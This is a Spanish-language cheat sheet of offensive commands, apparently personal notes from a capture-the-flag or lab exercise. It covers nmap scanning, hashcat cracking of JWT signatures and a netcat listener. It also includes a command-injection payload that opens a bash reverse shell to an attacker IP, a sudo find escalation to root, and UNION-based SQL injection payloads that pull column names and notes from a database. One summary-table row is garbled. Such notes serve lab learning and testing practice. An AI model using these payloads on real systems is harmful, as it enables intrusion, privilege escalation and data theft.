
## Resumen de comandos utilizados

| Comando completo                                                                                                                    | Qué hace                                                                                                                                                                         |
| ----------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `nmap -p- --open -sCV -n <IP> -oN escaneo.txt`                                                                                      | Escanea todos los puertos de la IP objetivo, muestra solo los abiertos, corre detección de versión y scripts, evita resolución DNS, y guarda el resultado en un archivo de texto |
| `hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt`                                                                       | Intenta crackear la firma de un JWT (HS256) contenida en `token.txt` probando las contraseñas del diccionario rockyou.txt                                                        |
| `nc -lvnp 443`                                                                                                                      | Pone la máquina en modo escucha en el puerto 443, mostrando información detallada de la conexión sin resolver nombres de host                                                    |
| `127.0.0.1; bash -c 'bash -i >& /dev/tcp/<TU_IP>/443 0>&1'`                                                                         | Inyecta un comando adicional que abre una bash interactiva y redirige su entrada/salida hacia `<TU_IP>:443`, logrando una reverse shell                                          |
| `script /dev/null -c bash`                                                                                                          | Estabiliza la shell obtenida, dándole comportamiento de terminal interactiva completa                                                                                            |
| cat /etc/passwd                                                                                                                     | grep bash`                                                                                                                                                                       |
| `ssh <user>@<IP>`                                                                                                                   | Establece una conexión remota segura al servidor objetivo usando un usuario y contraseña válidos                                                                                 |
| `sudo -l`                                                                                                                           | Lista los comandos que el usuario actual puede ejecutar con privilegios de sudo                                                                                                  |
| `sudo find . -exec /bin/sh \; -quit`                                                                                                | Abusa de un permiso sudo mal configurado sobre `find` para spawnear una shell con privilegios de root                                                                            |
| `nmap -sT 10.67.165.69`                                                                                                             | Realiza un escaneo TCP Connect completo contra la IP indicada                                                                                                                    |
| `sudo nmap -sS 10.67.165.69`                                                                                                        | Realiza un escaneo SYN (sigiloso) contra la IP indicada, requiere privilegios de root                                                                                            |
| `sudo nmap -sU 10.67.165.69`                                                                                                        | Realiza un escaneo de puertos UDP contra la IP indicada, requiere privilegios de root                                                                                            |
| `/about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"`               | Inyecta una consulta SQL para extraer, uno por uno, los nombres de las columnas de la tabla `people`                                                                             |
| `/about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"` | Inyecta una consulta SQL que concatena todos los nombres de columna de la tabla `people` en una sola línea                                                                       |
| `/about/0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1`                                                      | Inyecta una consulta SQL para extraer el contenido del campo `notes` del registro con `id = 1` en la tabla `people`                                                              |

## Escaneo de puertos con Nmap

```bash
nmap -p- --open -sCV -n <IP> -oN escaneo.txt
```

- `-p-` → escanea todos los puertos
- `--open` → muestra solo los puertos abiertos
- `-sCV` → realiza un escaneo de versión y script
- `-n` → evita la resolución de nombres DNS
- `-oN escaneo.txt` → guarda el resultado en un archivo de texto plano

## Hashcat — crackeo de JWT

```bash
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
```

Hashcat es una herramienta de recuperación de contraseñas que utiliza fuerza bruta y ataques de diccionario para descifrar hashes (en este caso, la firma JWT).

- `-m 16500` → especifica el tipo de hash (JWT HS256)

## Netcat — listener

```bash
nc -lvnp 443
```

- `-l` → escucha en el puerto especificado
- `-v` → modo verbose, muestra información detallada de la conexión
- `-n` → no resuelve nombres de host, solo usa direcciones IP
- `-p` → especifica el puerto en el que se va a escuchar (443 en este caso)

## RCE vía command injection

```bash
127.0.0.1; bash -c 'bash -i >& /dev/tcp/<TU_IP>/443 0>&1'
```

- `bash -c '...'` → le dice al sistema que ejecute el comando entre comillas usando el intérprete Bash
- `bash -i` → inicia un entorno de Bash interactivo (espera comandos y muestra resultados, como una terminal normal)
- `>&` → redirige tanto la salida estándar como los errores hacia el mismo lugar
- `/dev/tcp/<TU_IP>/443` → archivo virtual de Linux que permite abrir una conexión de red; en vez de imprimir en el monitor de la víctima, envía toda la entrada/salida por internet hacia `<TU_IP>` en el puerto 443 (normalmente usado para HTTPS, suele estar permitido en firewalls)
- `0>&1` → toma la entrada estándar (lo que escribís desde tu máquina) y la conecta a la salida de la conexión, así lo que tipeás se ejecuta en el servidor víctima

## Estabilizar shell

```bash
script /dev/null -c bash
```

## Encontrar usuarios con bash

```bash
cat /etc/passwd | grep bash
```

## Conexión SSH

```bash
ssh <user>@<IP>
```

El protocolo SSH (Secure Shell) permite conectarse de manera segura a un servidor remoto. Se necesita un nombre de usuario y la IP del servidor, que debe tener el puerto 22 abierto. Es más cómodo que una reverse shell (no hace falta), pero requiere la contraseña.

## Privilegios sudo

```bash
sudo -l
```

`-l` lista los privilegios que tiene el usuario actual en el sistema. Sirve para determinar si tiene permisos de administrador o puede ejecutar ciertos comandos con privilegios elevados.

## Escalada de privilegios con find

```bash
sudo find . -exec /bin/sh \; -quit
```

Acá se entra a una terminal con privilegios de root, lo que da control total sobre el sistema (modificar archivos, instalar software, cambiar configuraciones, etc).

**Cómo funciona:**

- **El origen:** ejecutás el comando con `sudo` (`sudo find ...`). Esto significa que el proceso padre (`find`) corre con los máximos privilegios del sistema: los de root.
- **La orden:** dentro de `find`, la opción `-exec` le pide que abra otro programa.
- **El disparador (`/bin/sh`):** al poner `/bin/sh`, se llama al ejecutable de la shell de Linux.
- **La herencia:** como `find` (el padre) tiene permisos de root, el proceso que genera (`/bin/sh`, el hijo) nace con esos mismos permisos de root.
- Si en vez de `/bin/sh` se pusiera `/bin/nano`, se abriría el editor de texto Nano con permisos de root. Con `sh` se abre una línea de comandos limpia con poder absoluto de administrador.

**Desglose de flags:**

- `-exec` → le dice a `find` que ejecute un comando específico en cada archivo que encuentre; en este caso `/bin/sh`, que abre una nueva shell
- `\;` → terminador que indica el final del comando que `find` debe ejecutar
- `-quit` → le dice a `find` que se detenga después de ejecutar el comando en el primer archivo encontrado, evitando que siga buscando y ejecutando innecesariamente

## Más comandos de Nmap

### Tipos de escaneo

|Tipo de escaneo|Comando de ejemplo|
|---|---|
|Connect Scan|`nmap -sT 10.67.165.69`|
|SYN Scan|`sudo nmap -sS 10.67.165.69`|
|UDP Scan|`sudo nmap -sU 10.67.165.69`|

### Opciones

|Opción|Propósito / funcionalidad|
|---|---|
|`-p-`|Escanea todos los puertos (los 65535)|
|`-p1-1023`|Escanea el rango de puertos del 1 al 1023|
|`-F`|Escanea los 100 puertos más comunes (Fast)|
|`-r`|Escanea los puertos de forma consecutiva (en orden, no aleatorio)|
|`-T<0-5>`|Plantilla de tiempos (0 el más lento, 5 el más rápido)|
|`--max-rate 50`|Envía paquetes a una velocidad menor o igual a 50 por segundo|
|`--min-rate 15`|Envía paquetes a una velocidad mayor o igual a 15 por segundo|
|`--min-parallelism 100`|Mantiene al menos 100 sondas/clones en paralelo|

## SQL Injection

Extrae los nombres de las columnas de la tabla `people` de forma individual:

```sql
/about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"
```

Agrupa y concatena todos los nombres de las columnas de la tabla `people` en una sola línea de texto para facilitar su lectura:

```sql
/about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"
```

Extrae el contenido del campo `notes` de la tabla `people` específicamente para el registro con `id = 1`:

```sql
/about/0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1
```


Comandos para el tratamiento y estabilización de la TTY.

```
script /dev/null -c bash
CTRL + Z
stty raw -echo;fg
reset xterm
export TERM=xterm && export SHELL=bash
stty rows 50 columns 236
```